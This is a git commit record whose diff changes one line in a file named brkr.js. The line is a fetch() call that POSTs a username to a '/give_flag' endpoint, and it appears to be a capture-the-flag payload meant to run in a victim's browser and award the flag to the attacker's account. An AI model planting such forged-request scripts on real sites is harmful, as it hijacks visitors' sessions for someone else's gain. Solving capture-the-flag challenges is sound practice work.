d3cf02c1552dfee135c3fa1872d88494efc3d2a0
Sai Teja <77612961+saitejagvt@users.noreply.github.com>
2024-02-24 01:30:28 +0530

    Update brkr.js

--- brkr.js
+++ brkr.js
@@ -1,1 +1,1 @@
-fetch('/give_flag', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ username: 'policeauctionsEntv' }) });
+fetch('/give_flag', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ username: 'dragon06Prdu' }) });
